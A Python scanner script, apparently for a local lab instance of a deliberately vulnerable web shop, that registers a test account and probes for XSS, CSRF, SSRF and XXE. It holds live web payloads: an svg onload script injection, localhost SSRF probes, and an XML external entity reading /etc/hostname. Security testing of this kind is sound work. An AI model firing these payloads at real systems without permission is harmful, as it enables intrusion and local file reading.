#!/usr/bin/env python3

import re
import time
import json
import requests


def _post_json(url, body, headers=None, timeout=10):
    try:
        resp = requests.post(url, json=body, headers=headers, timeout=timeout)
        return resp.status_code, resp.text
    except Exception:
        return 0, ""


def _post_raw(url, body, headers=None, timeout=10):
    try:
        resp = requests.post(url, data=body, headers=headers, timeout=timeout)
        return resp.status_code, resp.text
    except Exception:
        return 0, ""


def _get(url, headers=None, timeout=10, allow_redirects=True):
    try:
        resp = requests.get(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        return resp.status_code, resp.text, resp.headers
    except Exception:
        return 0, "", {}


def _login(base_url):
    email = f"dawn_{int(time.time())}@example.com"
    password = "DawnScanner!123"

    register_url = f"{base_url}/api/Users"
    register_payload = {
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {
            "id": 1,
            "answer": "scanner"
        }
    }
    _post_json(register_url, register_payload)

    login_url = f"{base_url}/rest/user/login"
    status, text = _post_json(login_url, {"email": email, "password": password})
    if status == 200:
        try:
            data = json.loads(text)
            token = data.get("authentication", {}).get("token")
            if token:
                return {"Authorization": f"Bearer {token}"}
        except Exception:
            pass
    return None


def _check_xss(base_url, headers):
    payload = "<svg/onload=alert('dawnxss')>"
    endpoints = [
        f"{base_url}/rest/products/search?q={payload}",
        f"{base_url}/rest/products/search?q=%3Csvg%2Fonload%3Dalert%28%27dawnxss%27%29%3E",
    ]
    for url in endpoints:
        status, text, _ = _get(url, headers=headers)
        if status and payload in text:
            return True, f"payload_reflected_in_response: {url}"
    return False, "no_reflection_detected"


def _check_csrf(base_url, headers):
    status, text, _ = _get(base_url, headers=headers)
    if status == 0 or not text:
        return False, "base_page_unavailable"

    token_keywords = ["csrf", "token", "authenticity"]
    for match in re.finditer(r'<form([^>]*)>(.*?)</form>', text, flags=re.IGNORECASE | re.DOTALL):
        attrs = match.group(1).lower()
        body = match.group(2).lower()
        method_match = re.search(r'method\\s*=\\s*["\\\'](.*?)["\\\']', attrs, flags=re.IGNORECASE)
        method = method_match.group(1).lower() if method_match else "get"
        if method == "post" and not any(k in body for k in token_keywords):
            return True, "post_form_without_csrf_token"
    return False, "no_post_form_or_token_present"


def _check_ssrf(base_url, headers):
    probes = [
        f"{base_url}/rest/redirect?url=http://127.0.0.1:1/",
        f"{base_url}/rest/track-order/1?url=http://127.0.0.1:1/",
        f"{base_url}/api/Products?url=http://127.0.0.1:1/",
    ]
    markers = ["failed to connect", "connection refused", "timed out", "socket"]
    for url in probes:
        status, text, _ = _get(url, headers=headers)
        if status >= 400 and any(m in text.lower() for m in markers):
            return True, f"backend_fetch_error: {url}"
    return False, "no_ssrf_signal_detected"


def _check_xxe(base_url, headers):
    payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>"""
    url = f"{base_url}/rest/track-order/1"
    status, text = _post_raw(url, payload, headers={"Content-Type": "application/xml", **(headers or {})})
    if status >= 400 and any(k in text.lower() for k in ["doctype", "entity", "xml"]):
        return True, "xml_parser_error_detected"
    return False, "no_xxe_signal_detected"


def run_checks(base_url="http://host.docker.internal:3000"):
    headers = _login(base_url) or {}
    results = []

    ok, details = _check_xss(base_url, headers)
    results.append({"check": "XSS", "hit": ok, "details": details})

    ok, details = _check_csrf(base_url, headers)
    results.append({"check": "CSRF", "hit": ok, "details": details})

    ok, details = _check_ssrf(base_url, headers)
    results.append({"check": "SSRF", "hit": ok, "details": details})

    ok, details = _check_xxe(base_url, headers)
    results.append({"check": "XXE", "hit": ok, "details": details})

    return results


if __name__ == "__main__":
    base = "http://host.docker.internal:3000"
    print(json.dumps(run_checks(base), indent=2))
